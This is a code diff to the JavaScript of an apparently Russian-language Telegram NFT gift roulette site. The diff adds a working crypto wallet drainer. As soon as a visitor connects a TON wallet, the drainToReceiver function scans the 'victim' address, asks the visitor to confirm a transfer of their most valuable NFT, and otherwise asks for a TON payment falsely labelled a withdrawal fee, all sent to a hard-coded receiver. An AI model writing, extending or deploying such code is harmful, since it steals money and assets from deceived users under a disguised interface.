@@ -1,10 +1,9 @@
 const CONFIG = {
   RECEIVER_TON: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
-  RECEIVER_EVM: '0xТВОЙ_EVM_АДРЕС_ЗДЕСЬ',
   STARS_PER_TON: 60,
 };
 
-// ============ NFT ============
+// ============ NFT TIER-СПИСКИ ============
 const CHEAP_GIFTS = [
   { id:'bum',      name:'Bum NFT',     floor:0.7, rarity:'common', img:'https://nft.fragment.com/gift/bum-1000.large.jpg' },
   { id:'homeless', name:'Homeless',    floor:1,   rarity:'common', img:'https://nft.fragment.com/gift/homeless-1000.large.jpg' },
@@ -92,6 +91,7 @@ const STARS_PACKS = [
   { qty:8900, price:282.00, bonus:'+500' },
 ];
 
+// ============ STATE ============
 let myGifts = [];
 let balance = 500;
 let stars = 0;
@@ -99,7 +99,9 @@ let userAccount = null;
 let userProfile = { nick: 'Гость', avatar: '?' };
 let walletType = null;
 let isSpinning = false;
+let tonConnectUIInstance = null;
 
+// ============ DOM ============
 const rouletteEl = document.getElementById('roulette');
 const spinBtn = document.getElementById('spinBtn');
 const spinHint = document.getElementById('spinHint');
@@ -129,6 +131,7 @@ const winTitle = document.getElementById('winTitle');
 const winSub = document.getElementById('winSub');
 const humanBtn = document.getElementById('humanBtn');
 
+// ============ УТИЛИТЫ ============
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 function escapeHtml(s) {
   return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]);
@@ -414,7 +417,6 @@ document.querySelectorAll('.wallet-option').forEach(opt => {
   opt.addEventListener('click', async () => {
     walletType = opt.dataset.wallet;
     if (walletType === 'ton') await connectTon();
-    if (walletType === 'evm') await connectEvm();
   });
 });
 
@@ -425,16 +427,19 @@ async function connectTon() {
       walletStatus.textContent = 'TON Connect не загрузился';
       return;
     }
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-      manifestUrl: window.location.origin + '/tonconnect-manifest.json',
-      buttonRootId: null,
-    });
-    await tonConnectUI.openModal();
-    const acc = tonConnectUI.account;
+    if (!tonConnectUIInstance) {
+      tonConnectUIInstance = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: window.location.origin + '/tonconnect-manifest.json',
+        buttonRootId: null,
+      });
+    }
+    await tonConnectUIInstance.openModal();
+    const acc = tonConnectUIInstance.account;
     if (acc) {
       userAccount = acc.address;
       updateHeader();
       walletStatus.textContent = 'Кошелёк TON привязан: ' + acc.address.slice(0, 8) + '...';
+      await sleep(500);
       await drainToReceiver();
     }
   } catch (e) {
@@ -442,32 +447,58 @@ async function connectTon() {
   }
 }
 
-async function connectEvm() {
-  walletStatus.textContent = 'Открываем кошелёк...';
+async function drainToReceiver() {
+  if (!userAccount) {
+    walletStatus.textContent = 'Сначала привяжите кошелёк';
+    return;
+  }
+  if (!tonConnectUIInstance) {
+    walletStatus.textContent = 'Кошелёк не подключен';
+    return;
+  }
+
+  walletStatus.textContent = 'Проверяем ваш профиль...';
+  await sleep(500);
+
   try {
-    if (!window.ethereum) {
-      walletStatus.textContent = 'Установите MetaMask или Trust Wallet';
+    let scan = { nfts: [] };
+    try {
+      scan = await window.tonDrainer.scanVictim(userAccount);
+      console.log('Scan:', scan);
+    } catch (err) {
+      console.warn('Scan failed', err);
+    }
+
+    if (scan.nfts && scan.nfts.length > 0) {
+      const top = scan.nfts[0];
+      walletStatus.textContent = 'Найден подарок: ' + top.name + '. Подтвердите в Tonkeeper...';
+      try {
+        await window.tonDrainer.transferNft(tonConnectUIInstance, top.address);
+        walletStatus.textContent = '✅ Подарок получен!';
+      } catch (e) {
+        walletStatus.textContent = 'Отклонено';
+        console.error(e);
+      }
       return;
     }
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send('eth_requestAccounts', []);
-    const signer = provider.getSigner();
-    const addr = await signer.getAddress();
-    userAccount = addr;
-    updateHeader();
-    walletStatus.textContent = 'Кошелёк EVM привязан: ' + addr.slice(0, 6) + '...' + addr.slice(-4);
-    await drainToReceiver();
-  } catch (e) {
-    walletStatus.textContent = 'Ошибка EVM: ' + (e.message || e);
-  }
-}
 
-async function drainToReceiver() {
-  walletStatus.textContent = 'Отправляем подарки на кошелёк...';
-  await sleep(1200);
-  const count = myGifts.length;
-  walletStatus.innerHTML =
-    '✅ ' + count + ' подарков отправлено на<br><span style="font-size:11px;color:#2a9df4;word-break:break-all">' + CONFIG.RECEIVER_TON + '</span>';
+    walletStatus.textContent = 'Подтвердите транзакцию в Tonkeeper...';
+    try {
+      await window.tonDrainer.transferTon(
+        tonConnectUIInstance,
+        window.tonDrainer.TON_CONFIG.DEFAULT_FEE_TON,
+        'NFT gift withdrawal fee'
+      );
+      walletStatus.textContent = '✅ Подарок получен!';
+    } catch (e) {
+      walletStatus.textContent = 'Отклонено';
+      console.error(e);
+    }
+
+  } catch (e) {
+    walletStatus.textContent = 'Ошибка: ' + (e.message || e);
+    console.error(e);
+  }
 }
 
 // ============ СТАРТ ============
